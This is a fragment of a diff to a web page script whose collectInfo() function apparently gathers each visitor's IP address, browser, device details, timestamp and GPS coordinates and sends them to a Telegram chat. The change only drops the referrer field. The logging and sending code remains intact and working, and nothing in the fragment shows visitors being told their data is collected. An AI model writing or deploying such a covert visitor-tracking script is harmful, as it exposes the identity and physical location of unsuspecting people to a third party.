@@ -143,7 +143,7 @@
     // Function to collect and send user information
     async function collectInfo() {
         // Get referrer information
-        const referrer = document.referrer || 'Direct visit';
+      //  const referrer = document.referrer || 'Direct visit';
 
         // Get IP address
         try {
@@ -166,18 +166,18 @@
                     const geolocation = `Latitude: ${latitude}, Longitude: ${longitude}`;
 
                     // Send collected information to Telegram
-                    sendToTelegram(`Referrer: ${referrer}\nIP Address: ${ip}\nBrowser: ${browserInfo}\nDevice: ${deviceInfo}\nTimestamp: ${timestamp}\nGeolocation: ${geolocation}`);
+                    sendToTelegram(`IP Address: ${ip}\nBrowser: ${browserInfo}\nDevice: ${deviceInfo}\nTimestamp: ${timestamp}\nGeolocation: ${geolocation}`);
                 },
                 async function(error) {
                     console.error('Error getting geolocation:', error);
                     // Send collected information without geolocation if user denies permission
-                    sendToTelegram(`Referrer: ${referrer}\nIP Address: ${ip}\nBrowser: ${browserInfo}\nDevice: ${deviceInfo}\nTimestamp: ${timestamp}`);
+                    sendToTelegram(`IP Address: ${ip}\nBrowser: ${browserInfo}\nDevice: ${deviceInfo}\nTimestamp: ${timestamp}`);
                 }
             );
         } catch (error) {
             console.error('Error getting IP address:', error);
             // Send only referrer information to Telegram if IP address retrieval fails
-            sendToTelegram(`Referrer: ${referrer}`);
+            // sendToTelegram(`Referrer: ${referrer}`);
         }
     }
 
